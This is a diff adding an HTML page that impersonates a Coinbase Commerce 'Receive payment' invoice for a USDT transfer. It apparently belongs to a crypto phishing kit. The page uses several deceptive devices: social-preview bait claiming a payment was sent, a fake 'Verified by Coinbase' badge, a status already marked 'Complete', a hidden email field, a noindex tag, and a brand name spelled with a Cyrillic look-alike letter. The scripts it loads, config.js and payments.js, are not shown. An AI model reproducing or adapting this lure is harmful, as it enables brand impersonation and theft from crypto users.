@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Receive payment | Coinbase Commerce</title>
+    <link rel="icon" href="./media/coinbase.svg" type="image/svg+xml">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+    <meta name="robots" content="noindex">
+    <meta property="og:title" content="A payment has been sent to you">
+    <meta property="og:description" content="Please review the details below and confirm receipt">
+    <meta property="og:image" content="https://i.ibb.co/LzBV8p87/og.png">
+    <meta property="og:image:width" content="1200"> 
+    <meta property="og:image:height" content="630">
+    <meta property="og:url" content="Coinbase">
+    <meta property="og:type" content="article"> 
+    <meta property="og:site_name" content="Receive payment | Coinbase commerce">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="A payment has been sent to you">
+    <meta name="twitter:description" content="Please review the details below and confirm receipt">
+    <meta name="twitter:image" content="https://i.ibb.co/LzBV8p87/og.png">
+</head>
+<body>
+    <div id="preloader" class="fixed inset-0 flex items-center justify-center bg-gray-100 z-50">
+        <div class="flex flex-col items-center">
+            <svg class="animate-spin h-10 w-10 text-blue-600 mb-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+            </svg>
+            <span class="text-gray-700 font-semibold">Loading your payment...</span>
+        </div>
+    </div>
+
+    <div id="paymentContent" class="payment-container hidden">
+        <div class="left-section">
+            <div class="logo-container">
+                <span class="text-2xl font-semibold">
+                    <span id="coinbaseTextDisplay" class="text-blue-600">Coinbase</span>
+                    <span id="commerceTextDisplay" class="text-gray-900">commerce</span>
+                </span>
+                <p class="text-sm text-gray-600 mt-1">
+                    A payment has been sent to you. Please review the details below and confirm receipt.
+                </p>
+            </div>
+            <div class="logo-image flex justify-center my-6 hidden md:flex" id="logoContainer">
+                <img src="./media/coinbase.png" alt="Coinbase Logo" class="w-62 h-auto">
+            </div>
+            <div class="content-center flex-1 flex flex-col justify-end">
+                <div class="flex items-center mb-2">
+                    <div>
+                        <div class="text-sm text-gray-600">From</div>
+                        <div class="text-base font-semibold text-gray-800 flex items-center">
+                            <span id="senderNameDisplay">Summit Marketing</span>
+                            <span class="group relative ml-2">
+                                <img id="verifiedIcon" src="./media/verified.png" alt="Verified Icon" class="w-4 h-4">
+                                <span class="absolute hidden group-hover:block bg-white border border-gray-200 p-2 rounded-md shadow-md z-10 text-sm text-gray-800 coinbase-tooltip">
+                                    Verified by Coinbase
+                                </span>
+                            </span>
+                        </div>
+                    </div>
+                </div>
+                <div class="mb-2" id="walletFieldDisplay" style="display: none;">
+                    <div class="text-sm text-gray-600 mb-1">Recipient address</div>
+                    <div class="text-base text-gray-800">
+                        <a href="#" id="walletLink" target="_blank" class="font-medium text-blue-600 hover:underline">
+                            <span id="walletShort"></span>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="right-section">
+            <div class="space-y-4 text-base">
+                <div class="flex justify-between items-center">
+                    <h2 class="text-lg font-semibold text-gray-800">Invoice Details</h2>
+                    <div class="flex items-center">
+                        <span class="text-sm font-medium text-gray-600 mr-2">Status</span>
+                        <span id="statusDisplay" class="px-3 py-1 bg-blue-100 text-blue-800 rounded-full text-sm font-medium">
+                            Complete
+                        </span>
+                    </div>
+                </div>
+                <div class="mb-6">
+                    <div class="text-sm text-gray-600 mb-2">Payment Methods</div>
+                    <div class="flex items-center space-x-2">
+                        <span class="text-base text-gray-800" id="currencyDisplay">USDT Balance</span>
+                        <img id="currencyIcon" src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="Currency Icon" class="w-5 h-5" loading="lazy">
+                        <span class="text-base text-gray-800" id="networkDisplay">Ethereum</span>
+                        <img id="networkIcon" src="https://cryptologos.cc/logos/ethereum-eth-logo.png" alt="Network Icon" class="w-5 h-5" loading="lazy">
+                    </div>
+                </div>
+                <div class="border-t border-gray-200 pt-4">
+                    <div class="flex justify-between text-sm font-medium text-gray-600 mb-2">
+                        <span>Item Description</span>
+                        <span class="w-24 text-right">Subtotal</span>
+                    </div>
+                    <div class="flex justify-between text-base text-gray-800 mb-2">
+                        <span id="titleDisplay">Payment</span>
+                        <span class="w-32 text-right"><span id="amountDisplay"></span>
+                    </div>
+                    <div class="flex justify-between text-sm text-gray-600 mb-2">
+                        <span>Fee</span>
+                        <span class="w-32 text-right">$<span id="feeDisplay"></span></span>
+                    </div>
+                    <div class="flex justify-between text-lg font-semibold text-gray-800 border-t border-gray-200 pt-4">
+                        <span>Total</span>
+                        <span>$<span id="amountDisplayTotal"></span> USD</span>
+                    </div>
+                </div>
+                <div class="flex justify-between items-center text-sm text-gray-600">
+                    <div>
+                        <span>Date: </span>
+                        <span id="dateDisplay"></span>
+                    </div>
+                    <div class="flex items-center group relative">
+                        <span class="mr-2">ID: </span>
+                        <span id="orderCode">Z3B7TWA</span>
+                    </div>
+                </div>
+                <div class="email-input-container" id="emailInputContainer" style="display: none;">
+                    <input type="email" id="emailInput" class="email-input" placeholder="Enter your email" required>
+                </div>
+            </div>
+            <button id="actionButton" class="action-btn flex items-center justify-center space-x-2">
+                <svg class="w-5 h-5 text-white" version="1.2" baseProfile="tiny" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024">
+                    <path fill="currentColor" d="M512.1,692c-99.4,0-180-80.5-180-180s80.6-180,180-180c89.1,0,163.1,65,177.3,150h181.3c-15.3-184.8-170-330-358.7-330c-198.8,0-360,161.2-360,360s161.2,360,360,360c188.7,0,343.4-145.2,358.7-330H689.3C675,627,601.2,692,512.1,692z"/>
+                </svg>
+                <span>Receive payment</span>
+            </button>
+            <div class="footer-text mt-4 flex flex-col items-center">
+                <span>Payment processed by</span>
+                <span>Coinbase сommerce</span>
+                <a href="https://www.coinbase.com/legal/eea" target="_blank" class="underline hover:text-blue-700">
+                    Privacy Policy
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <script type="module" src="config.js"></script>
+    <script type="module" src="payments.js"></script>
+</body>
+</html>
